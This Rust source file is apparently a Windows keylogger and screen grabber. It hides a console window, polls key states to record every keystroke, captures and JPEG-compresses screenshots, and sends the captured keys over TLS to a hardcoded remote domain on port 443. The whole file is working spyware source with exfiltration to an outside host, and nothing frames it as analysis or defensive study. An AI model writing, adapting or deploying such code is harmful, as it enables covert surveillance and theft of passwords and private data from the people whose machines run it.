extern crate repng;
extern crate scrap;
extern crate winapi;
extern crate user32;
extern crate kernel32;
use scrap::{Capturer, Display};
use std::io::{Read, Write};
use std::io::ErrorKind::WouldBlock;
use std::thread;
use std::sync::mpsc::channel;
use std::time::Duration;
use std::net::{SocketAddr, TcpStream};
use mozjpeg::{ColorSpace, Compress};
use openssl::ssl::{SslMethod, SslConnector, SslStream};
// remember $Env:OPENSSL_DIR='C:\Program Files\OpenSSL-Win64' !!!
// and you need OpenSSL libraries installed as well to build for Win64
use crate::pool::Pool;

const REMOTE_DOMAIN: &str = "revy.johnroark.us";
const SIGNAL_SIZE: usize = 4;
const REMOTE_PORT: i32 = 443;
const FRAME_TIME: u128 = 2000;
enum TcpData {Keys(Vec<u8>), Screenshot(Vec<u8>)}
#[derive(Copy, Clone)]
enum TcpSignalClient {
    StartSendKeys = 1,
    EndSendKeys,
    StartSendScreen,
    EndSendScreen,
    StartSendMeta,
    EndSendMeta
}

pub struct TLSSocketClient { sock: SslStream<TcpStream> } 

impl TLSSocketClient {

    pub fn init() -> TLSSocketClient {
        let connector = SslConnector::builder(SslMethod::tls()).unwrap().build();
        let stream = TcpStream::connect(
            format!("{}:{}", REMOTE_DOMAIN, REMOTE_PORT)
        ).unwrap();
        let mut stream = connector.connect(REMOTE_DOMAIN, stream).unwrap();
        TLSSocketClient { sock: stream }
    }
    
    pub fn send(&mut self, signal: TcpSignalClient, data: Option<Vec<u8>>) {
        let mut res = [0u8; SIGNAL_SIZE];
        match signal {
            TcpSignalClient::StartSendKeys => {
                println!("Sending keys <3");
                self.send_on_ack(&signal, 1, data.unwrap_or(Vec::new()));
            },
            TcpSignalClient::EndSendKeys => {
                self.sock.write(&2i32.to_be_bytes()); 
            },
            TcpSignalClient::StartSendScreen => {
                println!("Sending screenshot <3");
                self.send_on_ack(&signal, 2, data.unwrap_or(Vec::new()));
            },
            TcpSignalClient::EndSendScreen => {
                self.sock.write(&4i32.to_be_bytes());
            },
            _ => {}
        }
    }

    fn send_on_ack(&mut self, signal: &TcpSignalClient, ack: i32, data: Vec<u8>) {
        let mut res = vec![0u8; SIGNAL_SIZE];
        let sig_int = *signal as u8;
        self.sock.write(&sig_int.to_be_bytes());
        self.sock.read_to_end(&mut res).unwrap();
        if i32::from_be_bytes(build_sig_array(res)) == ack {
            self.sock.write(&data).unwrap(); 
        }
    }

}

fn build_sig_array(sig: Vec<u8>) -> [u8; 4] {
    assert!(sig.len() == 4);
    let mut res = [0u8; 4];
    unsafe {
        // this is still safe anyway dw :)
        res[0] = sig[0]; res[1] = sig[1]; res[2] = sig[2]; res[3] = res[3]
    }
    res
}

pub fn grab_multiple(amt: usize, socket: &mut TLSSocketClient) {
    let one_second = Duration::new(1, 0);
    let one_frame = one_second / 60;
    let pool = Pool::new(amt);
    let display = Display::primary().expect("Couldn't find primary display.");
    let mut capturer = Capturer::new(display).expect("Couldn't begin capture.");
    let (w, h) = (capturer.width(), capturer.height());
    loop {
        let (key_sender, receiver) = channel();
        let scr_sender = key_sender.clone();
        pool.execute(move || {
            let now = std::time::SystemTime::now();
            let mut keystrokes = Vec::new();
            loop {
                match now.elapsed().unwrap().as_millis() >= FRAME_TIME {
                    true => {
                        key_sender.send(TcpData::Keys(keystrokes)).unwrap();
                        keystrokes = Vec::new();
                    },
                    false => gather_keystrokes(&mut keystrokes)
                }
            }
        });
        let frame = {
            loop {
                match capturer.frame() {
                    Ok(buffer) => break buffer.to_vec(),
                    Err(error) => {
                        if error.kind() == WouldBlock {
                            thread::sleep(one_frame);
                            continue;
                        } else {
                            panic!("Error: {}", error);
                        }
                    }   
                }
            }
        };
        pool.execute(move || {
            match encode(frame, w, h) {
                Some(scr) => scr_sender.send(TcpData::Screenshot(scr)).unwrap(),
                None => {}
            }
        });
        for _ in 0..2 {
            match receiver.recv() {
                Ok(data) => match data{
                    TcpData::Keys(keys) => {
                        socket.send(TcpSignalClient::StartSendKeys, Some(keys))
                    },
                    TcpData::Screenshot(scr) => {
                    },
                },
                Err(_) => {}
            }
        }
    }
}

fn gather_keystrokes(keystrokes: &mut Vec<u8>) {
    // spawns a new windows (((console))) with IO inputs
	let window_sink: winapi::HWND;
	unsafe {
		kernel32::AllocConsole();
		window_sink = user32::FindWindowA(
            std::ffi::CString::new("ConsoleWindowClass")
                .unwrap()
                .as_ptr(),
            std::ptr::null()
        );
		user32::ShowWindow(window_sink,0);
	};
    for i in 8..190 {
        if unsafe { user32::GetAsyncKeyState(i) } == -32767 {
            // read the inputs into the (((console)))
            let key: String = match i as i32 {
                32 => " ".into(),
                8 => "[Backspace]".into(),
                13 => "\n".into(),
                winapi::VK_TAB => "[TAB]".into(),
                winapi::VK_SHIFT => "[SHIFT]".into(),
                winapi::VK_CONTROL => "[CTRL]".into(),
                winapi::VK_ESCAPE => "[ESCAPE]".into(),
                winapi::VK_END => "[END]".into(),
                winapi::VK_HOME => "[HOME]".into(),
                winapi::VK_LEFT => "[LEFT]".into(),
                winapi::VK_UP => "[UP]".into(),
                winapi::VK_RIGHT => "[RIGHT]".into(),
                winapi::VK_DOWN => "[DOWN]".into(),
                190|110 => ".".into(),
                _ => (i as u8 as char).to_string()
            };
            for word in key.as_bytes() { keystrokes.push(*word) }
        }
    };
}

fn encode(frame: Vec<u8>, w: usize, h: usize) -> Option<Vec<u8>> {
    let mut jpeg = Compress::new(ColorSpace::JCS_EXT_BGRA);
    jpeg.set_size(w, h);
    jpeg.set_quality(44.0);
    jpeg.set_mem_dest();
    jpeg.start_compress();
    match jpeg.write_scanlines(&frame) {
        true => {},
        false => return None
    }
    jpeg.finish_compress();
    Some(jpeg.data_to_vec().unwrap())
}
